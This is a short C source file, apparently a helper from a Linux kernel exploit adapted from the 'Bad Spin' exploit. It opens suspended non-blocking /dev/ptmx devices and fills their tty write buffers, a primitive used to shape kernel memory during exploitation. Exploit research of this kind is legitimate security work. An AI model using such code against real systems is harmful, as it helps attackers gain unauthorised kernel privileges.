// Adapted from Moshe Kol's Bad Spin Exploit

#include <asm/termbits.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "errhandling.h"
#include "tty_write_stuff.h"

int init_tty_nonblock_suspended(int* fds, int num)
{
  int fd, ret = 0;

  for (int i = 0; i < num; i++) {
    CHECK_FD(fd = open("/dev/ptmx", O_RDWR | O_NONBLOCK), "open: ptmx");
    turn_off_ptmx(fd);
    fds[i] = fd;
  }

  return ret;
}

void update_tty_write_buffer(int fd, void* buf, size_t size)
{
  flush_ptmx(fd);
  turn_off_ptmx(fd);
  make_ptmx_non_blocking(fd);
  assert(write(fd, buf, size) == -1 && errno == EAGAIN);
}
